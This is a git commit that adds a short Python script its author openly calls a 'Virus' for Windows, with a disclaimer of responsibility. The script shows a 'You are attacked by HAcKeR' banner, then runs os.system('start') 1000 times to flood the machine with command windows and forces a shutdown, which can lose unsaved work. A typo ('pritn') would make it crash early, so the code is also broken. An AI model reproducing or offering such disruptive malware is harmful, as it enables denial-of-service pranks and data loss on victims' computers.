74978341812c242d6650468138ab9b8a9b1aee17
Technical-Pro <john.srkpm@gmail.com>
2021-10-27 14:29:47 +0530

    Create CLV.py
    NOTE : The motive of this file is not for any illegal purpose and the developer(Grey_Hat99) is not responsible for any harm caused by anyone usingt his tool....
    
    **This Virus is only made for Windows only, Not made for Android and linux....**
    **Thankyou**

---
+++ CLV.py
@@ -0,0 +1,25 @@
+# Importing Modules 
+import os
+import time
+import pyfiglet 
+import keyboard 
+
+# Body 
+banner = pyfiglet.figlet_format("*Virus*")
+
+print(banner)
+print()
+pritn("[ Warning ] : This virus is not for linux or android , It is only made for Windows only ....")
+print()
+print("[*] You are attacked by HAcKeR...")
+print()
+time.sleep(2)
+
+# Attacking module 
+for i in range(1000):
+ os.system("start")
+ 
+time.sleep(1)
+os.system("shutdown/s")
+time.sleep(3)
+keyboard.press_and_release("Enter")
